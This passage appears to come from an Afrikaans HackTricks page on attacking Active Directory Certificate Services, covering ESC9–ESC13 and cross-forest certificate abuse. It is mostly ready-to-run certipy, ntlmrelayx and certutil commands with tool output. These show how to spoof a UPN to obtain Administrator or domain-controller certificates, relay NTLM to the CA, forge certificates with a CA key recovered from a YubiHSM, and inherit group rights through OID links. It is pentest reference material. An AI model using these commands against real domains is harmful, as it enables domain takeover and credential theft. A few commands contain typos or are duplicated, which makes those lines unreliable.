Daaropvolgend word `Jane` se `userPrincipalName` verander na `Administrator`, met opsetlike weglating van die `@corp.local` domein gedeelte:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Hierdie wysiging oortree nie beperkings nie, aangesien `Administrator@corp.local` as `Administrator` se `userPrincipalName` duidelik bly.

Hierdie, die `ESC9` sertifikaat sjabloon, wat as kwesbaar gemerk is, word aangevra as `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Dit word opgemerk dat die sertifikaat se `userPrincipalName` `Administrator` weerspieël, sonder enige “object SID”.

`Jane` se `userPrincipalName` word dan teruggestel na haar oorspronklike, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Die poging om te autentiseer met die uitgereikte sertifikaat lewer nou die NT-hash van `Administrator@corp.local`. Die opdrag moet `-domain <domain>` insluit weens die sertifikaat se gebrek aan domeinspesifikasie:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Swak Sertifikaat Kaartings - ESC10

### Verduideliking

Twee register sleutelwaardes op die domeinbeheerder word deur ESC10 verwys:

- Die standaardwaarde vir `CertificateMappingMethods` onder `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), voorheen gestel op `0x1F`.
- Die standaardinstelling vir `StrongCertificateBindingEnforcement` onder `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, voorheen `0`.

**Geval 1**

Wanneer `StrongCertificateBindingEnforcement` geconfigureer is as `0`.

**Geval 2**

As `CertificateMappingMethods` die `UPN` bit (`0x4`) insluit.

### Misbruik Geval 1

Met `StrongCertificateBindingEnforcement` geconfigureer as `0`, kan 'n rekening A met `GenericWrite` regte misbruik word om enige rekening B te kompromitteer.

Byvoorbeeld, met `GenericWrite` regte oor `Jane@corp.local`, mik 'n aanvaller om `Administrator@corp.local` te kompromitteer. Die prosedure weerspieël ESC9, wat enige sertifikaat sjabloon toelaat om gebruik te word.

Aanvanklik word `Jane` se hash verkry met behulp van Shadow Credentials, wat die `GenericWrite` misbruik.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Daarna word `Jane` se `userPrincipalName` verander na `Administrator`, met opsetlike weglating van die `@corp.local` gedeelte om 'n beperkingsoortreding te vermy.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Hierdie, 'n sertifikaat wat kliëntverifikasie moontlik maak, word aangevra as `Jane`, met die standaard `User` sjabloon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` se `userPrincipalName` word dan na sy oorspronklike, `Jane@corp.local`, teruggekeer.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Die verifikasie met die verkregen sertifikaat sal die NT-hash van `Administrator@corp.local` oplewer, wat die spesifikasie van die domein in die opdrag vereis weens die afwesigheid van domeinbesonderhede in die sertifikaat.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Misbruikgeval 2

Met die `CertificateMappingMethods` wat die `UPN` bit vlag (`0x4`) bevat, kan 'n rekening A met `GenericWrite` regte enige rekening B sonder 'n `userPrincipalName` eienskap, insluitend masjienrekeninge en die ingeboude domein administrateur `Administrator`, kompromenteer.

Hier is die doel om `DC$@corp.local` te kompromenteer, begin met die verkryging van `Jane` se hash deur Shadow Credentials, wat die `GenericWrite` benut.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` se `userPrincipalName` word dan gestel na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
'n Sertifikaat vir kliëntverifikasie word aangevra as `Jane` met die standaard `User` sjabloon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` se `userPrincipalName` word na hierdie proses na sy oorspronklike teruggestel.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Om via Schannel te autentiseer, word Certipy se `-ldap-shell` opsie gebruik, wat suksesvolle autentisering aandui as `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Deur die LDAP-skal, stel opdragte soos `set_rbcd` Resource-Based Constrained Delegation (RBCD) aanvalle in staat, wat moontlik die domeinbeheerder kan kompromenteer.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Hierdie kwesbaarheid strek ook uit na enige gebruikersrekening wat 'n `userPrincipalName` ontbreek of waar dit nie ooreenstem met die `sAMAccountName` nie, met die standaard `Administrator@corp.local` as 'n primêre teiken weens sy verhoogde LDAP-privileges en die afwesigheid van 'n `userPrincipalName` as standaard.

## Relaying NTLM to ICPR - ESC11

### Uitleg

As CA Server nie gekonfigureer is met `IF_ENFORCEENCRYPTICERTREQUEST` nie, kan dit NTLM relay-aanvalle maak sonder om te teken via RPC-diens. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Jy kan `certipy` gebruik om te tel of `Enforce Encryption for Requests` gedeaktiveer is en certipy sal `ESC11` kwesbaarhede wys.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Misbruik Scenario

Dit is nodig om 'n relay bediener op te stel:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Vir domeinbeheerders moet ons `-template` in DomainController spesifiseer. 

Of deur [sploutchy se fork van impacket](https://github.com/sploutchy/impacket) te gebruik:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell toegang tot ADCS CA met YubiHSM - ESC12

### Verduideliking

Administrateurs kan die Sertifikaatowerheid opstel om dit op 'n eksterne toestel soos die "Yubico YubiHSM2" te stoor.

As 'n USB-toestel aan die CA-bediener gekoppel is via 'n USB-poort, of 'n USB-toestelbediener in die geval dat die CA-bediener 'n virtuele masjien is, is 'n autentikasiesleutel (soms verwys as 'n "wagwoord") nodig vir die Sleutelberging Verskaffer om sleutels in die YubiHSM te genereer en te gebruik.

Hierdie sleutel/wagwoord word in die register onder `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in duidelike teks gestoor.

Verwysing in [hier](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Misbruik Scenario

As die CA se privaat sleutel op 'n fisiese USB-toestel gestoor is wanneer jy toegang tot 'n shell verkry, is dit moontlik om die sleutel te herstel.

Eerstens moet jy die CA-sertifikaat verkry (dit is publiek) en dan:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Finale, gebruik die certutil `-sign` opdrag om 'n nuwe arbitrêre sertifikaat te vervals met behulp van die CA-sertifikaat en sy privaat sleutel.

## OID Groep Skakel Misbruik - ESC13

### Verklaring

Die `msPKI-Certificate-Policy` attribuut laat die uitreikingsbeleid toe om by die sertifikaat sjabloon gevoeg te word. Die `msPKI-Enterprise-Oid` objekte wat verantwoordelik is vir die uitreiking van beleid kan ontdek word in die Konfigurasie Naam Konteks (CN=OID,CN=Public Key Services,CN=Services) van die PKI OID houer. 'n Beleid kan aan 'n AD-groep gekoppel word met behulp van hierdie objek se `msDS-OIDToGroupLink` attribuut, wat 'n stelsel in staat stel om 'n gebruiker te magtig wat die sertifikaat aanbied asof hy 'n lid van die groep was. [Verwysing hier](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Met ander woorde, wanneer 'n gebruiker toestemming het om 'n sertifikaat aan te vra en die sertifikaat aan 'n OID-groep gekoppel is, kan die gebruiker die voorregte van hierdie groep erf.

Gebruik [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) om OIDToGroupLink te vind:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Misbruik Scenario

Vind 'n gebruikersreg wat dit kan gebruik `certipy find` of `Certify.exe find /showAllPermissions`.

As `John` toestemming het om `VulnerableTemplate` te registreer, kan die gebruiker die voorregte van die `VulnerableGroup` groep erf.

Alles wat dit moet doen, is om die sjabloon te spesifiseer, dit sal 'n sertifikaat met OIDToGroupLink regte ontvang.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Kompromitering van Woude met Sertifikate Verduidelik in Passiewe Stem

### Breking van Woud Vertroue deur Kompromiteerde CA's

Die konfigurasie vir **cross-forest enrollment** is relatief eenvoudig gemaak. Die **root CA sertifikaat** van die hulpbronwoud word deur administrateurs **gepubliseer na die rekeningwoude**, en die **enterprise CA** sertifikate van die hulpbronwoud word **by die `NTAuthCertificates` en AIA houers in elke rekeningwoud gevoeg**. Om te verduidelik, hierdie reëling verleen die **CA in die hulpbronwoud volledige beheer** oor al die ander woude waarvoor dit PKI bestuur. Indien hierdie CA **deur aanvallers gekompromitteer word**, kan sertifikate vir alle gebruikers in beide die hulpbron- en rekeningwoude **deur hulle vervals word**, wat die sekuriteitsgrens van die woud breek.

### Registrasie Privileges Gegee aan Buitelandse Principals

In multi-woud omgewings is versigtigheid nodig rakende Enterprise CA's wat **sertifikaat sjablone publiseer** wat **Geverifieerde Gebruikers of buitelandse principals** (gebruikers/groepe buite die woud waartoe die Enterprise CA behoort) **registrasie en redigeringsregte** toelaat.\
Na verifikasie oor 'n vertroue, word die **Geverifieerde Gebruikers SID** aan die gebruiker se token deur AD gevoeg. Dus, indien 'n domein 'n Enterprise CA het met 'n sjabloon wat **Geverifieerde Gebruikers registrasiegeregte toelaat**, kan 'n sjabloon potensieel **deur 'n gebruiker van 'n ander woud geregistreer word**. Net so, indien **registrasiegeregte eksplisiet aan 'n buitelandse principal deur 'n sjabloon gegee word**, word 'n **cross-forest toegang-beheer verhouding aldus geskep**, wat 'n principal van een woud in staat stel om **in 'n sjabloon van 'n ander woud te registreer**.

Albei scenario's lei tot 'n **toename in die aanvaloppervlak** van een woud na 'n ander. Die instellings van die sertifikaat sjabloon kan deur 'n aanvaller uitgebuit word om addisionele privileges in 'n buitelandse domein te verkry.


{{#include ../../../banners/hacktricks-training.md}}
